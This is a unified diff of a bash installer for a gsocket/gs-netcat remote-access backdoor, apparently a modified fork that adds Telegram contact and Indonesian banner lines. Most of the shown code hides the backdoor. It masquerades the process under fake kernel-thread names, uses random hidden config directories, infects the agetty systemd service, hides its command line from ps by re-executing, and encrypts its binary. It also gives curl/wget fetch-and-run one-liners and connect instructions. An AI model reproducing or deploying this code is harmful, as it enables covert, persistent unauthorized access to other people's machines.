@@ -1,6 +1,9 @@
 #! /usr/bin/env bash
 
 
+# If called like: 'bash -c "$(curl -fsSL https://.../deploy.sh)"' then
+# the ps-output will show the entire script as command line. To "kill" the command
+# line we re-exec and call eval on the string.
 [ -z "$GS_NOEVAL" ] && [ "${#BASH_EXECUTION_STRING}" -gt 128 ] && GS_NOEVAL="$BASH_EXECUTION_STRING" IFS="" exec bash -c 'eval "$GS_NOEVAL"'
 unset GS_NOEVAL
 
@@ -104,18 +107,11 @@ SERVICE_HIDDEN_NAME_DEFAULT="${service_hidden_name_arr[$((RANDOM % ${#service_hi
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
 proc_name_arr=("sshd:" "[kthreadd]" "[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
-# for str in "${proc_name_arr[@]}"; do
-# 	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9_-]/\\&/g')"
-# done
-# PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
-# ~/.local/<NAME>
+
 config_dir_name_arr=("tmp" "etc" "lib" "cache" "bin" "share")
 CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_arr[@]}))]}"
 
-### DEFAULTS:
-# GS_INFECT=1
-# GS_NOTE=1
 #GS_FFPID=1
 GS_REEXEC=1
 GS_BC=1
@@ -133,7 +129,24 @@ GS_MEMEXEC=1
 [ -z "$GS_MEMEXEC" ] && unset GS_BC # implied
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
-
+# systemd candidates for binary infection
+# res=$(command -v dbus-daemon) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("dbus")
+# }
+# res=$(command -v /lib/systemd/systemd-journald) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-journald")
+# }
+# res=$(command -v /lib/systemd/systemd-udevd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-udevd")
+# }
+# res=$(command -v rsyslogd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("rsyslog")
+# }
+# => Got notification message from PID 52031, but reception only permitted for main PID 52029
 res=$(command -v agetty) && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
 	if systemctl is-active --quiet 'getty@tty1' &>/dev/null; then
@@ -1570,8 +1583,9 @@ HOWTO_CONNECT_OUT()
 		xstr="GS_ARGS='-w' "
 	}
 	# After all install attempts output help how to uninstall
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${UNINST_CMD}${CN}"
 	echo -e "--> To connect use one of the following
---> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}
+--> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}"
 }
 
 
@@ -1713,7 +1727,7 @@ do_bincrypter() {
 
 	[ -z "$GS_BC" ] && return
 	str="Bincrypter........................................................................."
-	[ -n "$BC_LOCK" ] && str="Bincrypter (BC_LOCK=${BC_LOCK:0:10}............................................................................"
+	[ -n "$BC_LOCK" ] && str="Bincrypter (BC_LOCK=${BC_LOCK:0:10}...)........................................................................."
 	echo -en "${str:0:70}"
 
 	declare -F _bincrypter >/dev/null || {
@@ -2458,7 +2472,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-[[ -n $GS_BRANCH ]] && WARN "Gsocket Bypass @bboscat"
+[[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By bboscat"
 
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
@@ -2534,7 +2548,7 @@ gs_start
 }
 
 # Default values are known and easily detected by users/admins.
-
+{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "ERROR OR UPDATE? CONTACT t.me/pejatenbin"
 [[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] && {
 	unset str
 	url="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
@@ -2548,6 +2562,6 @@ gs_start
     ${CM}${str}bash -c \"\$(wget -qO-  ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}"
 }
 
-echo -e "--> ${CW}KASIH PAHAM BOSKUUUU${CN}"
+echo -e "--> ${CW}KASIH PAHAM BOSKUH${CN}"
 
 exit_code 0
